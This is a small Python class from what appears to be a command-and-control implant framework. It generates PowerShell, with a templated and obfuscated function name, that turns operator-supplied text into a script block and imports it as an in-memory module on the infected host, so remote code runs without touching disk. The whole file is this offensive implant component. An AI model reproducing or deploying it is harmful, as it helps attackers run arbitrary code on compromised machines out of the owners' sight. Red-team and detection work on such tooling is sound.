class LoadModule:
    type = "LM"
    args = "name of powershell module on server"
    input = "load_module"

    def process_implant_response(self,data, args):
        return f"Load module:\n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_load_module }} ($data) {
    $b = $data
    $data = $b -split '::', 2
    $name = $data[0].Replace(" ","")
    $bgt = $data[1]
    $b = [ScriptBlock]::Create($bgt)
    New-Module -ScriptBlock $b -Name $name -Verbose | Import-Module
    $global:tr = Get-Command -Module $name -Verbose
}'''
        return var

